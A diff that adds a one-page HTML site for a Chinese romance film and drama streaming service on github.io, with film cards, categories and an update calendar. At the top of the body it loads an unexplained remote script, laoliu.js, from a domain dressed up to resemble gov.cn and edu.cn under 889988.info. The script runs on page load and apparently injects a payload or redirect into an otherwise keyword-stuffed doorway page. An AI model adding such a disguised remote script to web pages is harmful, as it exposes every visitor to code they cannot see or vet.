@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>恋恋影视 - 浪漫电影电视剧在线观看 | lianlianyingshi-h5.github.io</title>
+<meta name="description" content="恋恋影视(lianlianyingshi-h5.github.io)专注浪漫电影、甜宠剧、韩剧、青春动漫在线观看，高清流畅，适合一个人也适合两个人一起追的影视站。" />
+<meta name="keywords" content="恋恋影视,lianlianyingshi-h5,浪漫电影,甜宠剧,韩剧,在线影视" />
+<style>
+:root{
+  --bg:#1b1320;
+  --bg2:#251823;
+  --pink:#ff7eb3;
+  --rose:#ff5c8a;
+  --gold:#ffd9a0;
+  --text:#f7eef3;
+  --muted:#c8b3bf;
+  --card:rgba(255,255,255,.04);
+  --line:rgba(255,126,179,.25);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:radial-gradient(1200px 600px at 80% -10%,#3a2030 0%,var(--bg) 55%) fixed;
+  color:var(--text);
+  line-height:1.75;
+}
+a{color:var(--pink);text-decoration:none}
+img{display:block;max-width:100%}
+
+/* 布局：左侧品牌墙 + 右侧内容 */
+.shell{
+  display:grid;
+  grid-template-columns:300px 1fr;
+  min-height:100vh;
+}
+.brand-wall{
+  position:sticky;top:0;height:100vh;
+  padding:48px 28px;
+  background:linear-gradient(160deg,#2c1825,#1a1018);
+  border-right:1px solid var(--line);
+  display:flex;flex-direction:column;justify-content:space-between;
+}
+.brand-wall h1{
+  font-size:34px;letter-spacing:2px;
+  background:linear-gradient(90deg,var(--gold),var(--pink),var(--rose));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.brand-wall p{color:var(--muted);font-size:14px;margin-top:14px}
+.nav{display:flex;flex-direction:column;gap:14px;margin-top:36px}
+.nav a{
+  padding:12px 16px;border:1px solid var(--line);border-radius:12px;
+  font-weight:700;transition:.25s;
+}
+.nav a:hover{background:rgba(255,126,179,.12);color:#fff}
+
+.main{padding:0 0 60px}
+.hero{
+  padding:90px 32px 50px;
+  border-bottom:1px solid var(--line);
+}
+.hero h2{font-size:40px;line-height:1.25;margin-bottom:16px}
+.hero h2 span{color:var(--pink)}
+.hero p{max-width:640px;color:var(--muted)}
+.cta{
+  display:inline-block;margin-top:26px;padding:14px 32px;border-radius:40px;
+  background:linear-gradient(90deg,var(--rose),var(--pink));
+  color:#1b1320;font-weight:900;
+}
+
+.section{padding:56px 32px;scroll-margin-top:20px}
+.section > h2{
+  font-size:26px;margin-bottom:6px;display:flex;align-items:center;gap:10px;
+}
+.section > h2::before{
+  content:"";width:6px;height:26px;border-radius:4px;
+  background:linear-gradient(var(--gold),var(--rose));
+}
+.section > p.lead{color:var(--muted);margin-bottom:26px;font-size:14px}
+
+/* 横向片单 */
+.film-row{
+  display:flex;gap:18px;overflow-x:auto;padding-bottom:10px;
+}
+.film{
+  flex:0 0 220px;background:var(--card);border:1px solid var(--line);
+  border-radius:16px;overflow:hidden;
+}
+.film img{height:300px;object-fit:cover}
+.film .meta{padding:14px}
+.film .meta h3{font-size:16px}
+.film .meta span{font-size:12px;color:var(--muted)}
+
+/* 分类网格 */
+.cat-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:18px;
+}
+.cat{
+  padding:26px 20px;border-radius:16px;
+  background:linear-gradient(160deg,rgba(255,126,179,.12),rgba(255,217,160,.05));
+  border:1px solid var(--line);
+}
+.cat h3{font-size:18px;margin-bottom:6px}
+.cat p{font-size:13px;color:var(--muted)}
+
+/* 追剧日历时间轴 */
+.timeline{display:flex;flex-direction:column;gap:18px}
+.day{
+  display:grid;grid-template-columns:90px 1fr;gap:18px;
+  padding:18px;border-left:3px solid var(--rose);background:var(--card);border-radius:0 14px 14px 0;
+}
+.day b{color:var(--gold);font-size:15px}
+.day h3{font-size:16px}
+.day p{font-size:13px;color:var(--muted)}
+
+footer{
+  padding:28px 32px;color:var(--muted);font-size:13px;
+  border-top:1px solid var(--line);
+}
+
+/* 移动端重构 */
+@media(max-width:860px){
+  .shell{grid-template-columns:1fr}
+  .brand-wall{position:static;height:auto;flex-direction:column}
+  .nav{flex-direction:row;flex-wrap:wrap}
+  .nav a{flex:1 1 40%}
+  .hero{padding:60px 20px 36px}
+  .hero h2{font-size:30px}
+  .section{padding:44px 20px}
+  .day{grid-template-columns:70px 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="shell">
+
+  <!-- 左侧品牌墙 -->
+  <aside class="brand-wall">
+    <div>
+      <h1>恋恋影视</h1>
+      <p>lianlianyingshi-h5.github.io<br/>把每一次开场，都变成一次心动。</p>
+    </div>
+    <nav class="nav">
+      <a href="#">首页</a>
+      <a href="#films">恋爱片单</a>
+      <a href="#cats">频道分类</a>
+      <a href="#calendar">追剧日历</a>
+    </nav>
+    <p style="font-size:12px;color:#8d7585">© 2026 恋恋影视 · 交流学习用</p>
+  </aside>
+
+  <!-- 右侧主体 -->
+  <main class="main">
+
+    <!-- 首页 -->
+    <header class="hero">
+      <h2>陪你熬夜的<br/><span>不只是剧情，还有恋恋影视</span></h2>
+      <p>
+        恋恋影视聚焦浪漫电影、甜宠剧、韩剧、青春与治愈系内容。
+        在 lianlianyingshi-h5.github.io，你可以随时打开一部片子，
+        一个人慢慢看，也可以和喜欢的人一起看到片尾字幕。
+      </p>
+      <a class="cta" href="#films">看看今天聊什么片</a>
+    </header>
+
+    <!-- 恋爱片单 -->
+    <section class="section" id="films">
+      <h2>恋爱片单</h2>
+      <p class="lead">编辑每周挑选：甜、虐、治愈、意难平，各来一点。</p>
+      <div class="film-row">
+        <article class="film">
+          <img src="https://via.placeholder.com/440x600" alt="恋恋影视 浪漫电影 封面" />
+          <div class="meta"><h3>初雪里的告白</h3><span>浪漫 / 青春 / 9.1分</span></div>
+        </article>
+        <article class="film">
+          <img src="https://via.placeholder.com/440x600" alt="恋恋影视 韩剧封面" />
+          <div class="meta"><h3>总裁慢半拍</h3><span>韩剧 / 甜宠 / 更新中</span></div>
+        </article>
+        <article class="film">
+          <img src="https://via.placeholder.com/440x600" alt="恋恋影视 治愈动漫封面" />
+          <div class="meta"><h3>海风信件</h3><span>动漫 / 治愈 / 全季</span></div>
+        </article>
+        <article class="film">
+          <img src="https://via.placeholder.com/440x600" alt="恋恋影视 经典爱情片封面" />
+          <div class="meta"><h3>旧电影院</h3><span>经典 / 文艺 / 8.8分</span></div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 频道分类 -->
+    <section class="section" id="cats">
+      <h2>频道分类</h2>
+      <p class="lead">按心情选，不按片名搜。</p>
+      <div class="cat-grid">
+        <article class="cat"><h3>💗 甜宠剧</h3><p>先甜后虐，再甜回来</p></article>
+        <article class="cat"><h3>🎬 浪漫电影</h3><p>约会夜 / 一个人也行</p></article>
+        <article class="cat"><h3>🇰🇷 韩剧</h3><p>车戏、雨戏、重逢戏</p></article>
+        <article class="cat"><h3>🌊 青春动漫</h3><p>夏日、信、天台、告白</p></article>
+      </div>
+    </section>
+
+    <!-- 追剧日历 -->
+    <section class="section" id="calendar">
+      <h2>追剧日历</h2>
+      <p class="lead">恋恋影视每周更新节奏。</p>
+      <div class="timeline">
+        <article class="day">
+          <b>周一</b>
+          <div><h3>新剧开更</h3><p>韩剧与甜宠剧更新，弹幕比剧情还上头。</p></div>
+        </article>
+        <article class="day">
+          <b>周三</b>
+          <div><h3>经典重映</h3><p>老爱情片修复版上线，适合怀旧党。</p></div>
+        </article>
+        <article class="day">
+          <b>周五</b>
+          <div><h3>周末片单</h3><p>编辑挑 5 部，恋爱脑和理智派都能看。</p></div>
+        </article>
+        <article class="day">
+          <b>周日</b>
+          <div><h3>治愈专场</h3><p>动漫 + 轻电影，看完不内耗。</p></div>
+        </article>
+      </div>
+    </section>
+
+    <footer>
+      恋恋影视 · lianlianyingshi-h5.github.io · 本页为静态单页演示，内链以 # 占位，不生成 robots.txt / sitemap.xml
+    </footer>
+
+  </main>
+</div>
+
+</body>
+</html>
